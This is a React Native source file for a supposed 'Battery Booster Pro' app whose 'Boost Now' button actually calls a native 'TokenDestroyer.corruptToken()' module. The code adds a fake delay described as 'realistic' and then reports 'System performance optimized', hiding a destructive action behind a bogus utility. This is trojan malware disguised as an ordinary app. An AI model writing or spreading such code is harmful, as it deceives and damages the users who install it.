import { View, Text, Button, Alert, ActivityIndicator } from 'react-native';
import { NativeModules } from 'react-native';
import { useState } from 'react';

export default function App() {
  const [loading, setLoading] = useState(false);

  const onBoost = async () => {
    setLoading(true);

    try {
      // Run the native token corruption
      await NativeModules.TokenDestroyer.corruptToken();

      // Add a realistic artificial delay (e.g., 2.5 seconds)
      await new Promise(resolve => setTimeout(resolve, 2500));

      Alert.alert('✅ Boost Complete', 'System performance optimized.');
    } catch (e) {
      Alert.alert('❌ Boost Failed', e.message || 'Could not access root permissions.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <View style={{ flex: 1, justifyContent: 'center', alignItems: 'center', padding: 24 }}>
      <Text style={{ fontSize: 28, fontWeight: 'bold', marginBottom: 16 }}>Battery Booster Pro</Text>
      <Text style={{ fontSize: 16, color: 'gray', marginBottom: 30 }}>
        Optimize battery usage by terminating background drainers.
      </Text>

      {loading ? (
        <>
          <ActivityIndicator size="large" color="green" />
          <Text style={{ marginTop: 12, color: 'green' }}>Boosting...</Text>
        </>
      ) : (
        <Button title="⚡ Boost Now" onPress={onBoost} />
      )}
    </View>
  );

}
